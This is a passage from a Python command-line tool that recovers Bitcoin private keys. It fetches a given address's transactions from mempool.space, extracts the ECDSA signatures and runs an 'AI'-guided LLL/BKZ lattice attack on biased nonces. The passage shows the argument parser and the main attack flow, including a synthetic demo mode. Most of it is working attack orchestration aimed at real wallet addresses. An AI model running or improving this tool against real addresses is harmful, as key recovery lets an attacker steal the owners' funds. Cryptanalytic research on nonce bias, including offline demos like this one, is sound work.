                      help="Bitcoin address to fetch from mempool.space")
    mode.add_argument("-f","--file", type=Path, metavar="CSV",
                      help="Existing SignatureRSZ.csv to attack")
    mode.add_argument("--demo",  action="store_true",
                      help="Synthetic demo with weak nonces (no network)")
    mode.add_argument("--gen",   action="store_true",
                      help="Generate demo CSV only")
    p.add_argument("-b","--bits",   type=int, default=None, metavar="B",
                   help="Nonce bias hint in bits (default: AI auto-detects)")
    p.add_argument("-n","--sigs",   type=int, default=6,   metavar="N",
                   help="Signatures per lattice subset (default 6, max effective ~36)")
    p.add_argument("--subsets",     type=int, default=40,  metavar="N",
                   help="Random subsets to try per B value (default 40)")
    p.add_argument("--auto-bits",   action="store_true",
                   help="Search B ± 8…±40 around elected value if first pass fails")
    p.add_argument("--bkz",         action="store_true",
                   help="Use BKZ instead of LLL (slower but stronger)")
    p.add_argument("--confirmed",   action="store_true",
                   help="Confirmed txs only (skip mempool)")
    p.add_argument("-o","--out",    type=Path, default=Path("SignatureRSZ.csv"),
                   help="CSV output path (default: SignatureRSZ.csv)")
    p.add_argument("--msg",         default="BudBot LLL Demo",
                   help="Message for demo/gen mode")
    return p


def main(argv=None):
    args  = _parser().parse_args(argv)
    algo  = "BKZ" if args.bkz else "LLL"
    t0    = time.perf_counter()

    print_banner()

    # ── gen ────────────────────────────────────────────────────────────────────
    if args.gen:
        b = args.bits or 128
        _p(f"[cyan]Generating {args.sigs} biased sigs (B={b}) → {args.out}[/]")
        d = generate_demo_csv(args.out, b, args.sigs, args.msg)
        _p(f"[green]Saved:[/] {args.out}\n[dim]True key: [yellow]{d:064x}[/][/]")
        return

    # ── demo ───────────────────────────────────────────────────────────────────
    if args.demo:
        b = args.bits or 128
        _p(f"[cyan]Demo: {args.sigs} biased sigs (B={b})…[/]")
        d_true = generate_demo_csv(args.out, b, args.sigs, args.msg)
        _p(f"  [dim]True key: [yellow]{d_true:064x}[/][/]\n")
        csv_path = args.out
    elif args.address:
        if not _HAS_REQ: _p("[red]pip install requests[/]"); sys.exit(1)
        _p(f"[cyan]Fetching for [bold]{args.address}[/]…[/]")
        try: records, n_txs = auto_fetch(args.address, args.out, args.confirmed)
        except Exception as e: _p(f"[red]Fetch error: {e}[/]"); sys.exit(1)
        if _HAS_RICH:
            t = Table(border_style="cyan", show_header=False)
            t.add_column("K", style="dim cyan"); t.add_column("V", style="bright_white")
            t.add_row("Address",           f"[bold]{args.address}[/]")
            t.add_row("Transactions",      f"[bold yellow]{n_txs}[/]")
            t.add_row("ECDSA sigs parsed", f"[bold green]{len(records)}[/]")
            _con.print(Panel(t, title="[bold cyan]📡  mempool.space[/]", border_style="cyan"))
            _con.print()
        if len(records) < 2:
            _p("[red]Not enough ECDSA sigs (Taproot/Schnorr address?)[/]"); sys.exit(1)
        csv_path = args.out; d_true = None
    elif args.file:
        csv_path = args.file; d_true = None
    else:
        _parser().print_help(); sys.exit(0)

    # ── load CSV ───────────────────────────────────────────────────────────────
    _p(f"[cyan]Loading [bold]{csv_path}[/]…[/]")
    try: all_msgs, all_sigs, all_pubs = load_csv(csv_path)
    except Exception as e: _p(f"[red]CSV error: {e}[/]"); sys.exit(1)
    N = len(all_msgs)
    _p(f"[dim]Loaded {N} signatures[/]\n")

    # ── AI bias detection ──────────────────────────────────────────────────────
    if _HAS_RICH: _con.print(Rule("[bold magenta]AI Bias Detection[/]"))
    detector       = BiasDetector([r for r, s in all_sigs])
    elected_b, diag = detector.detect(hint_b=args.bits)
    print_bias_table(diag)

    # ── ML-ranked LLL attack ───────────────────────────────────────────────────
    if _HAS_RICH: _con.print(Rule("[bold cyan]ML-Ranked LLL Attack[/]")); _con.print()

    k      = min(args.sigs, MAX_LLL_DIM - 2, N)
    scorer = CandidateScorer(all_msgs, all_sigs, all_pubs)
    n_b_values = len([0,-8,8,-16,16,-24,24,-32,32,-40,40]) if args.auto_bits else 1
    total_steps = args.subsets * n_b_values
    result = None

    if _HAS_RICH:
        with Progress(
            SpinnerColumn(style="bright_cyan"),
            BarColumn(bar_width=40, style="cyan", complete_style="bright_green"),
            TextColumn("[progress.description]{task.description}"),
            MofNCompleteColumn(), TimeElapsedColumn(),
            console=_con,
        ) as prog:
            task = prog.add_task(
                f"[cyan]B={elected_b}  k={k}  {algo}[/]", total=total_steps)
            if args.auto_bits:
                r3 = adaptive_search(all_msgs, all_sigs, all_pubs,
                                     elected_b, k, args.subsets, algo, scorer,
                                     prog=prog, task=task)
                result = r3
            else:
                r2 = run_attack(all_msgs, all_sigs, all_pubs,
                                elected_b, k, args.subsets, algo, scorer,
                                prog=prog, task=task)
                result = (r2[0], elected_b, r2[1]) if r2 else None
    else:
        print(f"Attacking (B={elected_b}, k={k}, {algo}, subsets={args.subsets})…")
        if args.auto_bits:
            result = adaptive_search(all_msgs, all_sigs, all_pubs,
                                     elected_b, k, args.subsets, algo, scorer)
        else:
            r2 = run_attack(all_msgs, all_sigs, all_pubs,
                            elected_b, k, args.subsets, algo, scorer)
            result = (r2[0], elected_b, r2[1]) if r2 else None

    elapsed = time.perf_counter() - t0
    _p("")
    if result:
        key, used_b, conf = result
        print_result(key, used_b, conf, scorer, elapsed,
                     d_true=d_true if args.demo else None)
        if args.demo and d_true is not None:
            _p(("[bold bright_green]✓  Matches true key.[/]"
                if key == d_true else f"[yellow]No match. True: {d_true:064x}[/]") + "\n")
    else:
        print_result(None, elected_b, 0.0, scorer, elapsed)

    return result


if __name__ == "__main__":
    main()
